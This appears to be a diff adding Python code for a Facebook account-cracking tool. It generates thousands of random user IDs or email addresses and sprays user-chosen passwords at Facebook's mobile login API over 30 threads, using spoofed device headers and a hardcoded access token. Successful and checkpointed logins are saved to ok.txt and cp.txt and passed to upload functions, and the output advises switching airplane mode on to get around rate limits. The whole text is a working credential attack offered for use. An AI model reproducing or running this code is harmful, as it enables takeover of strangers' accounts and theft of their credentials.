+		#idx = input("%s [+] ENTER A DIGIT (1-9): %s"%(Y,G))
+		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
+		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(10000 MAX): \033[0;92m"))
+		if (limit)>10000:
+			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
+		try:
+			for n in range(limit):
+				_ = random.randint(x,xx)
+				__ = idx
+				self.id.append(__+str(_))
+			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
+			with ThreadPoolExecutor(max_workers=30) as coeg:
+				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))
+				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G)) 
+				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
+				if len(listpass)<=5:
+					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
+				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
+				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))
+				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(Y))
+				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
+				for user in self.id:
+					coeg.submit(self.api, user, listpass.split(","))
+			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
+		except Exception as e:exit(str(e))
+		
+
+	def old_11(self):
+		x = 1111111111111
+		xx = 9999999999999
+		idx = "50000"
+		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
+		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): \033[0;92m"))
+		if (limit)>10000:
+			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
+		try:
+			for n in range(limit):
+				_ = random.randint(x,xx)
+				__ = idx
+				self.id.append(__+str(_))
+			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
+			with ThreadPoolExecutor(max_workers=30) as coeg:
+				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))
+				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))  
+				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
+				if len(listpass)<=5:
+					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
+				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
+				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))
+				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(Y))
+				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
+				for user in self.id:
+					coeg.submit(self.api, user, listpass.split(","))
+			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
+		except Exception as e:exit(str(e))
+		
+		
+	def old_13(self):
+		x = 1111111111111
+		xx = 9999999999999
+		idx = "1000"
+		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
+		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): \033[0;92m"))
+		if (limit)>50000:
+			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
+		try:
+			for n in range(limit):
+				_ = random.randint(x,xx)
+				__ = idx
+				self.id.append(__+str(_))
+			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
+			with ThreadPoolExecutor(max_workers=30) as coeg:
+				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))
+				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))  
+				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
+				if len(listpass)<=5:
+					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
+				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
+				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))
+				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(Y))
+				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
+				for user in self.id:
+					coeg.submit(self.api, user, listpass.split(","))
+			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
+		except Exception as e:exit(str(e))
+
+
+	def email(self):
+		x = 111
+		xx = 999
+		nam = input("%s [?] TYPE A NAME %s(EX: Abir): "%(Y,G))
+		nam = nam.replace(" ", "")
+		print("%s EXAMPLE  : %s@gmail.com, @yahoo.com, @hotmail.com ETC"%(Y,G))
+		idx = input("%s DOMAIN  : "%(B))
+		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): \033[0;92m"))
+		if (limit)>50000:
+			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
+		try:
+			for n in range(limit):
+				_ = random.randint(x,xx)
+				__ = idx
+				___ = nam
+				self.id.append(___+str(_)+__)
+			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
+			with ThreadPoolExecutor(max_workers=30) as coeg:
+				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))
+				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G)) 
+				listpass = input(" [?] ENTER PASSWORD : ")
+				if len(listpass)<=5:
+					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
+				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
+				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))
+				print("%s [+] CP RESULT SAVED IN -> cp.txt"%(Y))
+				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
+				for user in self.id:
+					coeg.submit(self.api, user, listpass.split(","))
+			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
+		except Exception as e:exit(str(e))
+		
+	def oldcrack(self):
+		x = 11111111
+		xx = 99999999
+		idx = " 1000000"
+		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
+		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): \033[0;92m"))
+		if (limit)>50000:
+			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
+		try:
+			for n in range(limit):
+				_ = random.randint(x,xx)
+				__ = idx
+				self.id.append(__+str(_))
+			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
+			with ThreadPoolExecutor(max_workers=30) as coeg:
+				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))
+				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))
+				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
+				if len(listpass)<=5:
+					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
+				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
+				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))
+				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(Y))
+				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
+				for user in self.id:
+					coeg.submit(self.api, user, listpass.split(","))
+			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
+		except Exception as e:exit(str(e))
+		
+
+	def api(self, uid, pwx):
+		ua = random.choice([
+			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]", 
+			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
+			"Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16';]"
+			"Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36;]"
+		])
+		sys.stdout.write(
+			"\r\r %s[>_] [SAMEER] : %s/%s -> \033[0;92m [ SAMEER-OK:%s ]- \033[0;91m[SAMERR-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
+		); sys.stdout.flush()
+		for pw in pwx:
+			pw = pw.lower()
+			ses = requests.Session()
+			headers = {
+				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
+				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
+				"x-fb-net-hni": str(random.randint(20000, 40000)), 
+				"x-fb-connection-quality": "EXCELLENT",
+				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
+				"user-agent": ua, 
+				"content-type": "application/x-www-form-urlencoded", 
+				"x-fb-http-engine": "Liger"
+			}
+			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
+			if "session_key" in response.text and "EAAA" in response.text:
+				print("\r \033[0;92m[SAMEER-OK] %s|%s\033[0;97m         "%(uid, pw))
+				self.ok.append("%s|%s"%(uid, pw))
+				open("ok.txt","a").write(" [SAMEER-OK] %s|%s\n"%(uid, pw))
+				uploadoks()
+				break
+			elif "www.facebook.com" in response.json()["error_msg"]:
+				print("\r \033[0;91m[SAMEER-CP] %s|%s\033[0;97m         "%(uid, pw))
+				self.cp.append("%s|%s"%(uid, pw))
+				open("cp.txt","a").write(" [SAMEER-CP] %s|%s\n"%(uid, pw))
+				uploadcps()
+				break
+			else:
+				continue
+
+		self.loop +=1
+
+if len(sys.argv) == 2:
+	if sys.argv[1] == "--help" or sys.argv[1] == "-h":
+		helpnote()
+	else:
+		Main()
+
+try:Main()
+except Exception as e:exit(str(e))
+
 
